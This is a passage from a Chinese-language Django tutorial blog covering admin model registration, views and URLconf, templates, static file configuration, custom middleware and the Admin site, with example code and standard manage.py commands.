<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.site.register(BookInfo, BookInfoAdmin)</span><br></pre></td></tr></table></figure>

<ul>
<li>刷新 BookInfo 的列表也，所有的属性都显示出来了</li>
</ul>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-16-30-04.png" class="">

<p>最终 booktest&#x2F;admin.py 文件代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line"></span><br><span class="line"># Register your models here.</span><br><span class="line">from booktest.models import BookInfo, HeroInfo</span><br><span class="line"></span><br><span class="line">class BookInfoAdmin(admin.ModelAdmin):</span><br><span class="line">    list_display = [&#x27;id&#x27;, &#x27;btitle&#x27;, &#x27;bpub_date&#x27;]</span><br><span class="line"></span><br><span class="line">class HeroInfoAdmin(admin.ModelAdmin):</span><br><span class="line">    list_display = [&#x27;id&#x27;, &#x27;hname&#x27;, &#x27;hgender&#x27;, &#x27;hcomment&#x27;]</span><br><span class="line"></span><br><span class="line">admin.site.register(BookInfo, BookInfoAdmin)</span><br><span class="line">admin.site.register(HeroInfo, HeroInfoAdmin)</span><br></pre></td></tr></table></figure>

<h1 id="5-视图以及-URL"><a href="#5-视图以及-URL" class="headerlink" title="5. 视图以及 URL"></a>5. 视图以及 URL</h1><p>django 的设计框架是 MVT ，用户在 URL 中请求的是视图，视图接收请求后进行处理，并将处理结果返回给请求者。<br>使用视图时需要进行两步操作：</p>
<ol>
<li>定义视图</li>
<li>配置 URLconf</li>
</ol>
<h2 id="5-1-定义视图"><a href="#5-1-定义视图" class="headerlink" title="5.1. 定义视图"></a>5.1. 定义视图</h2><p>视图就是一个 python 函数， 被定义在 <code>views.py</code> 中。</p>
<p>视图必须有一个参数，一般叫 <code>request</code> ,视图必须返回 <code>HttpResponse</code> 对象, <code>HttpResponse</code> 中的参数内容会显示在浏览器页面上。</p>
<p>打开 <code>booktest/views.py</code> 文件，定义视图 <code>index</code> 如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line"># Create your views here.</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">    return HttpResponse(&quot;index&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="5-2-配置-URLconf"><a href="#5-2-配置-URLconf" class="headerlink" title="5.2. 配置 URLconf"></a>5.2. 配置 URLconf</h2><h3 id="5-2-1-查找视图的过程"><a href="#5-2-1-查找视图的过程" class="headerlink" title="5.2.1. 查找视图的过程"></a>5.2.1. 查找视图的过程</h3><p>请求者在浏览器中输入 url ，请求到网站后，获取 url 信息，然后编写好的 URLconf 逐条匹配，如果匹配成功则调用对应的视图函数，如果所有的 URLconf 都没有匹配成功，则返回 404 错误。</p>
<p>一条 URLconf 包括 url 规则、视图两部分：</p>
<ul>
<li>url 规则使用正则表达式定义。</li>
<li>视图就是在 <code>views.py</code> 中定义的视图函数。</li>
</ul>
<p>需要两步完成 URLconf 配置：</p>
<ol>
<li>在应用中定义 URLconf 。</li>
<li>包含到项目中的 URLconf 中。</li>
</ol>
<p>在 booktest 应用下创建 <code>urls.py</code> 文件，定义代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line">from booktest import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^$&#x27;, views.index),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>包含到项目 <code>test01/urls.py</code> 文件中, 完整代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import include, url</span><br><span class="line">from django.contrib import admin</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^admin/&#x27;, include(admin.site.urls)),</span><br><span class="line">    url(r&#x27;^&#x27;, include(&#x27;booktest.urls&#x27;))</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="5-3-请求访问"><a href="#5-3-请求访问" class="headerlink" title="5.3. 请求访问"></a>5.3. 请求访问</h2><p>视图和 URLconf 都定义好后，在流浪其中打开 <code>localhost:8000</code> 页面。</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-17-07-21.png" class="">

<h1 id="6-模板"><a href="#6-模板" class="headerlink" title="6. 模板"></a>6. 模板</h1><p>在 django 中，将前端的内容定义在模板中，然后再把模板交给视图调用，各种漂亮、炫酷的效果就出现了。</p>
<h2 id="6-1-创建模板"><a href="#6-1-创建模板" class="headerlink" title="6.1. 创建模板"></a>6.1. 创建模板</h2><p>为 booktet 的视图 index 创建模板 <code>index.html</code> ,目录结构如下图：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-17-13-06.png" class="">

<p>一般将定义 <code>templates</code> 目录在项目的根目录，其中根据不同的应用创建不同的目录。</p>
<p>设置查找模板的路径： 打开 <code>test01/setting.py</code> 文件，设置 TEMPLATES 的 DIRS 值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;,</span><br><span class="line">        &#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &#x27;templates&#x27;)], # 设置模板路径</span><br><span class="line">        &#x27;APP_DIRS&#x27;: True,</span><br><span class="line">        &#x27;OPTIONS&#x27;: &#123;</span><br><span class="line">            &#x27;context_processors&#x27;: [</span><br><span class="line">                &#x27;django.template.context_processors.debug&#x27;,</span><br><span class="line">                &#x27;django.template.context_processors.request&#x27;,</span><br><span class="line">                &#x27;django.contrib.auth.context_processors.auth&#x27;,</span><br><span class="line">                &#x27;django.contrib.messages.context_processors.messages&#x27;,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="6-2-自定义模板"><a href="#6-2-自定义模板" class="headerlink" title="6.2. 自定义模板"></a>6.2. 自定义模板</h2><p>打开 <code>templates/booktest/index.html</code>，定义代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;读书列表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- title 为变量名--&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123; title &#125;&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% for i in list %&#125;</span><br><span class="line">&#123;&#123; i &#125;&#125;&lt;br&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="6-3-视图调用模板"><a href="#6-3-视图调用模板" class="headerlink" title="6.3. 视图调用模板"></a>6.3. 视图调用模板</h2><p>打开 <code>booktest/views.py</code> 文件，调用上面的模板文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line"># Create your views here.</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from django.template import loader, RequestContext</span><br><span class="line">def index(request):</span><br><span class="line">    # 1. 获取模板</span><br><span class="line">    template = loader.get_template(&#x27;booktest/index.html&#x27;)</span><br><span class="line">    # 2. 定义上下文</span><br><span class="line">    context = RequestContext(request, &#123;&#x27;title&#x27;:&#x27;图书列表&#x27;, &#x27;list&#x27;:range(10)&#125;)</span><br><span class="line">    # 3. 渲染模板</span><br><span class="line">    return HttpResponse(template.render(context))</span><br></pre></td></tr></table></figure>

<p>对应的页面如下图：</p>
<img src="/2019/12/13/Django%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/2019-12-14-17-27-26.png" class="">

<h2 id="6-4-视图调用模板简写"><a href="#6-4-视图调用模板简写" class="headerlink" title="6.4. 视图调用模板简写"></a>6.4. 视图调用模板简写</h2><p>视图调用模板都要执行以上三部分，于是 django 提供了一个函数 render 封装了以上代码。</p>
<p>方法 render 包含 3 个参数：</p>
<ul>
<li>第一个参数为 request 对象</li>
<li>第二个参数为模板文件路径</li>
<li>第三个参数为字典，表示向模板中传递的上下文数据</li>
</ul>
<p>打开 <code>booktest/views.py</code> 文件，调用 render 的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def index(request):</span><br><span class="line">    context = &#123;&#x27;title&#x27;:&#x27;图书列表&#x27;, &#x27;list&#x27;:range(10)&#125;</span><br><span class="line">    return render(request, &#x27;booktest/index.html&#x27;, context)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对应的<a href="https://github.com/CKCat/Note/tree/master/Python/Django/test01">代码地址</a></p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>安装 Django，可以指定版本安装。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install Django==3.2.11</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>创建项目和应用，一个项目可以创建多个应用。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建项目</span></span><br><span class="line">django-admin startproject mysite</span><br><span class="line"><span class="comment"># 创建应用</span></span><br><span class="line">python manage.py startapp polls</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>URLconf<br>函数 include() 允许引用其它 URLconfs。每当 Django 遇到 include() 时，它会截断与此项匹配的 URL 的部分，并将剩余的字符串发送到 URLconf 以供进一步处理。</li>
</ol>
<p>函数 path() 具有四个参数，两个必须参数：route 和 view，两个可选参数：kwargs 和 name。</p>
<ul>
<li>route: 是一个匹配 URL 的准则（类似正则表达式）。当 Django 响应一个请求时，它会从 urlpatterns 的第一项开始，按顺序依次匹配列表中的项，直到找到匹配的项。</li>
<li>view: 当 Django 找到了一个匹配的准则，就会调用这个特定的视图函数，并传入一个 HttpRequest 对象作为第一个参数，被“捕获”的参数以关键字参数的形式传入。</li>
<li>kwargs: 任意个关键字参数可以作为一个字典传递给目标视图函数。</li>
<li>name: 为你的 URL 取名能使你在 Django 的任意地方唯一地引用它，尤其是在模板中。</li>
</ul>
<ol start="4">
<li>数据库配置：<br>ENGINE – 可选值有 ‘django.db.backends.sqlite3’，’django.db.backends.postgresql’，’django.db.backends.mysql’，或 ‘django.db.backends.oracle’等。</li>
</ol>
<p>NAME – 数据库的名称。</p>
<blockquote>
<p>除了 SQLite 以外，使用其他数据库之前必须先创建好数据库。</p>
</blockquote>
<p>创建数据表。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py migrate polls</span><br></pre></td></tr></table></figure>

<p>迁移。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations</span><br></pre></td></tr></table></figure>

<p>查看迁移对应的 SQL 语句。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py sqlmigrate polls 0001</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>创建管理员账号</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py createsuperuser</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>模板<br>项目的 TEMPLATES 配置项描述了 Django 如何载入和渲染模板。默认的设置文件设置了 DjangoTemplates 后端，并将 APP_DIRS 设置成了 True。这一选项将会让 DjangoTemplates 在每个 INSTALLED_APPS 文件夹中寻找 “templates” 子目录。</li>
</ol>
<p>我们需要帮助 Django 选择正确的模板，最好的方法就是把他们放入各自的 命名空间 中，也就是把这些模板放入一个和 自身 应用重名的子文件夹里。</p>
<ol start="7">
<li><p>去除硬编码 URL<br>可以使用 <code>&#123;% url 'name' args %&#125;</code> 标签去除硬编码 URL，其中 name 为 <code>url()</code> 函数中 name 参数定义的字符串。</p>
</li>
<li><p>通用视图 ListView 和 DetailView<br>DetailView 期望从 URL 中捕获名为 “pk” 的主键值。</p>
</li>
</ol>
<p>默认情况下，通用视图 DetailView 使用一个叫做 <code>&lt;app name&gt;/&lt;model name&gt;_detail.html</code> ListView 使用一个叫做 <code>&lt;app name&gt;/&lt;model name&gt;_list.html</code> 的默认模板；可以通过修改 template_name 的值改变默认的模板。</p>
<p>默认情况下， DetailView 和 ListView 会根据 model 属性自动提供 context 变量，默认名称为模型的小写，可以通过修改 context_object_name 属性改变默认值。</p>
<ol start="9">
<li>自动测试<br>根据被测试文件或类名，创建对应的测试文件，编写测试类继承 <code>django.test.TestCase</code>，编写测试代码。</li>
</ol>
<p>测试试图还需要导入 <code>django.test.Client</code> 类，该类可以模拟用户和视图层代码的交互。</p>
<p>更深入的测试可以使用 Selenium 工具。</p>
<ol start="10">
<li>静态文件<br>Django 的 STATICFILES_FINDERS 设置包含了一系列的查找器，它们知道去哪里找到 static 文件。AppDirectoriesFinder 是默认查找器中的一个，它会在每个 INSTALLED_APPS 中指定的应用的子文件中寻找名称为 static 的特定文件夹。管理后台采用相同的目录结构管理它的静态文件。</li>
</ol>
<p>我们需要指引 Django 选择正确的静态文件，而最好的方式就是把它们放入各自的 命名空间 。</p>
<p>我们需要再 html 文件开头添加 <code>&#123;% load static %&#125;</code> 才可以使用 <code>&#123;% static %&#125;</code> 模板标签，该标签会生成静态文件的绝对路径。</p>
<p><code>&#123;% static %&#125;</code> 模板标签在静态文件（例如样式表）中是不可用的。</p>
<ol start="11">
<li>自定义后台界面和风格</li>
</ol>
<p>在项目根目录新建一个文件夹 <code>templates/admin</code>，并将存放 Django 默认模板的目录（<code>django/contrib/admin/templates</code>）内的模板文件 <code>admin/base_site.html</code> 复制到这个目录内。可以使用 <code> python -c &quot;import django; print(django.__path__)&quot;</code> 查看 Django 的安装目录。</p>
<p>修改 <code>setting.py</code> 中 TEMPLATES 选项中 DIRS 字段为 <code>BASE_DIR / &#39;templates&#39;</code>。最后修改 <code>admin/base_site.html</code> 文件中的内容。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title>Django学习-其他</title>
    <url>/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/</url>
    <content><![CDATA[<h1 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h1><p>项目中的 CSS、图片、js 都是静态文件。一般会将静态文件放到一个单独的目录中，以方便管理。在 html 页面中调用时，也需要指定静态文件的路径，Django 中提供了一种解析的方式配置静态文件路径。静态文件可以放在项目根目录下，也可以放在应用的目录下，由于有些静态文件在项目中是通用的，所以推荐放在项目的根目录下，方便管理。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>创建 <code>test5</code> 项目并创建 <code>booktest</code> 应用.</p>
<p>1）在 <code>test5/settings.py</code> 文件中定义静态文件存放的物理目录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STATIC_URL = &#x27;/static/&#x27;</span><br><span class="line">STATICFILES_DIRS = [</span><br><span class="line">    os.path.join(BASE_DIR, &#x27;static&#x27;),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>2）在项目根目录下创建 <code>static</code> 目录，再创建 <code>img</code> 、<code>css</code> 、<code>js</code> 目录。</p>
<p>3）在 <code>booktest/views.py</code> 中定义视图 <code>static_test</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def static_test(request):</span><br><span class="line">    return render(request,&#x27;booktest/static_test.html&#x27;)</span><br></pre></td></tr></table></figure>

<p>4）在 <code>booktest/urls.py</code> 中配置 url。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url(r&#x27;^static_test/$&#x27;,views.static_test),</span><br></pre></td></tr></table></figure>

<p>5）在 <code>templates/booktest/</code> 下创建 <code>static_test.html</code> 文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;静态文件&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&quot;/static/img/sg.jpeg&quot;/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>6）保存图片到 <code>static/img/</code> 目录下，名称为 <code>sg.jpeg</code> 。</p>
<p>7）运行服务器，浏览效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-16-21-19.png" class="">

<h2 id="配置静态文件"><a href="#配置静态文件" class="headerlink" title="配置静态文件"></a>配置静态文件</h2><p>Django 提供了一种配置，可以在 html 页面中可以隐藏真实路径。</p>
<p>1）在 <code>test5/settings.py</code> 文件中修改 STATIC_URL 项。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># STATIC_URL = &#x27;/static/&#x27;</span><br><span class="line">STATIC_URL = &#x27;/abc/&#x27;</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器，图片找不到了，效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-16-25-56.png" class="">

<p>3）修改 <code>templates/booktest/static_test.html</code> 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;静态文件&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">修改前：&lt;img src=&quot;/static/img/sg.jpeg&quot;/&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">修改后：&lt;img src=&quot;/abc/img/sg.jpeg&quot;/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>3）刷新浏览器，效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-16-27-27.png" class="">

<p>4）查看网页源代码，发现可以网址和真实地址之间没有关系。</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-16-32-39.png" class="">

<p>为了安全可以通过配置项隐藏真实图片路径，在模板中写成固定路径，后期维护太麻烦，可以使用 <code>static</code> 标签，根据配置项生成静态文件路径。</p>
<p>1）修改 <code>templates/booktest/static_test.html</code> 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;静态文件&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">修改前：&lt;img src=&quot;/static/img/sg.jpeg&quot;/&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">修改后：&lt;img src=&quot;/abc/img/sg.jpeg&quot;/&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">动态配置：</span><br><span class="line">&#123;%load static from staticfiles%&#125;</span><br><span class="line">&lt;img src=&quot;&#123;%static &quot;img/sg.jpeg&quot; %&#125;&quot;/&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>2）刷新浏览器，效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-16-37-10.png" class="">

<p>查看网页源代码如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-16-37-35.png" class="">

<p>说明：这种方案可以隐藏真实的静态文件路径，但是结合 Nginx 布署时，会将所有的静态文件都交给 Nginx 处理，而不用转到 Django 部分，所以这项配置就无效了。</p>
<h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p>Django 中的中间件是一个轻量级、底层的插件系统，可以介入 Django 的请求和响应处理过程，修改 Django 的输入或输出。中间件的设计为开发者提供了一种无侵入式的开发方式，增强了 Django 框架的健壮性，其它的 MVC 框架也有这个功能，名称为 IoC 。</p>
<p>Django 在中间件中预置了五个方法，这五个方法的区别在于不同的阶段执行，对输入或输出进行干预，方法如下：</p>
<p>1）初始化：无需任何参数，服务器响应第一个请求的时候调用一次，用于确定是否启用当前中间件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def __init__(self):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>2）处理请求前：在每个请求上，request 对象产生之后，url 匹配之前调用，返回 None 或 HttpResponse 对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def process_request(self, request):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>3）处理视图前：在每个请求上，url 匹配之后，视图函数调用之前调用，返回 None 或 HttpResponse 对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def process_view(self, request, view_func, *view_args, **view_kwargs):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>4）处理响应后：视图函数调用之后，所有响应返回浏览器之前被调用，在每个请求上调用，返回 HttpResponse 对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def process_response(self, request, response):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>5）异常处理：当视图抛出异常时调用，在每个请求上调用，返回一个 HttpResponse 对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def process_exception(self, request,exception):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>中间件是一个独立的 python 类，，可以定义这五个方法中的一个或多个。</p>
<p>1）在 <code>booktest</code>目录下创建 <code>middleware.py</code>文件，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class my_mid:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        print(&quot;-----init-----&quot;)</span><br><span class="line"></span><br><span class="line">    def process_request(self, request):</span><br><span class="line">        print(&quot;-----process_request-----&quot;)</span><br><span class="line"></span><br><span class="line">    def process_view(self, view_func, *view_args, **kwargs):</span><br><span class="line">        print(&quot;-----process_view-----&quot;)</span><br><span class="line"></span><br><span class="line">    def process_response(self, request, response):</span><br><span class="line">        print(&quot;-----process_response-----&quot;)</span><br><span class="line">        return response</span><br></pre></td></tr></table></figure>

<p>2）在 <code>test5/settings.py</code> 文件中，向 <code>MIDDLEWARE_CLASSES</code> 项中注册。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE_CLASSES = (</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.SessionAuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">    &#x27;booktest.middleware.my_mid&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>3）修改 <code>booktest/views.py</code> 中视图 index 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def index(request):</span><br><span class="line">    print(&quot;++==index==++&quot;)</span><br><span class="line">    return render(request, &#x27;booktest/index.html&#x27;)</span><br></pre></td></tr></table></figure>

<p>4）运行服务器，命令行中效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-16-58-12.png" class="">

<p>5）刷新页面，命令行中效果如下图：</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-16-58-35.png" class="">

<h2 id="异常中间件"><a href="#异常中间件" class="headerlink" title="异常中间件"></a>异常中间件</h2><p>1）在 <code>booktest/middleware.py</code> 中定义两个异常类如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class exp1:</span><br><span class="line">    def process_exception(self, request, exception):</span><br><span class="line">        print(&quot;-----exp1-----&quot;)</span><br><span class="line"></span><br><span class="line">class exp2:</span><br><span class="line">    def process_exception(self, request, exception):</span><br><span class="line">        print(&quot;-----exp2-----&quot;)</span><br></pre></td></tr></table></figure>

<p>2）在 <code>test5/settings.py</code> 文件中，向 <code>MIDDLEWARE_CLASSES</code> 项中注册。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE_CLASSES = (</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.SessionAuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">    &#x27;booktest.middleware.my_mid&#x27;,</span><br><span class="line">    &#x27;booktest.middleware.exp1&#x27;,</span><br><span class="line">    &#x27;booktest.middleware.exp2&#x27;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>3）修改 <code>booktest/views.py</code> 中视图 index 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def index(request):</span><br><span class="line">    print(&quot;++==index==++&quot;)</span><br><span class="line">    raise Exception(&#x27;自定义异常&#x27;)</span><br><span class="line">    return render(request, &#x27;booktest/index.html&#x27;)</span><br></pre></td></tr></table></figure>

<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-05-07.png" class="">

<p>总结：如果多个注册的中间件类中都有 <code>process_exception</code> 的方法，则先注册的后执行。</p>
<h1 id="Admin-站点"><a href="#Admin-站点" class="headerlink" title="Admin 站点"></a>Admin 站点</h1><p>内容发布的部分由网站的管理员负责查看、添加、修改、删除数据，开发这些重复的功能是一件单调乏味、缺乏创造力的工作，为此，Django 能够根据定义的模型类自动地生成管理模块。</p>
<p>在第一部分对管理站点做了简单介绍，现在做详细讲解。在 Django 项目中默认启用 Admin 管理站点。</p>
<p>1）准备工作：创建管理员的用户名和密码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py createsuperuser</span><br></pre></td></tr></table></figure>

<p>按提示填写用户名、邮箱、密码。</p>
<img src="/2020/01/15/Django%E5%AD%A6%E4%B9%A0-%E5%85%B6%E4%BB%96/2020-01-15-17-07-40.png" class="">

<p>2）使用：在应用的 <code>admin.py</code> 中注册模型类</p>
<p>例：打开 <code>booktest/admin.py</code> 文件，注册地区模型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.contrib import admin</span><br><span class="line">from booktest.models import *</span><br><span class="line"></span><br><span class="line">admin.site.register(AreaInfo)</span><br></pre></td></tr></table></figure>

<p>3）输入如下网址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/admin/</span><br></pre></td></tr></table></figure>

<p>按提示填写用户名、密码，点击“Log in”按钮登录。</p>
<p>登录成功后，可以看到 AreaInfos，可以进行增加、修改、删除、查询的管理。</p>
<h2 id="控制管理页展示"><a href="#控制管理页展示" class="headerlink" title="控制管理页展示"></a>控制管理页展示</h2><p>类 ModelAdmin 可以控制模型在 Admin 界面中的展示方式，主要包括在列表页的展示方式、添加修改页的展示方式。</p>
<p>1）在 <code>booktest/admin.py</code> 中，注册模型类前定义管理类 AreaAdmin 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>管理类有两种使用方式：</p>
<ul>
<li>注册参数</li>
<li>装饰器</li>
</ul>
<p>注册参数：打开 <code>booktest/admin.py</code> 文件，注册模型类代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.site.register(AreaInfo,AreaAdmin)</span><br></pre></td></tr></table></figure>

<p>装饰器：打开 <code>booktest/admin.py</code> 文件，在管理类上注册模型类，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@admin.register(AreaInfo)</span><br><span class="line">class AreaAdmin(admin.ModelAdmin):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>接下来介绍如何控制列表页、增加修改页展示效果。</p>
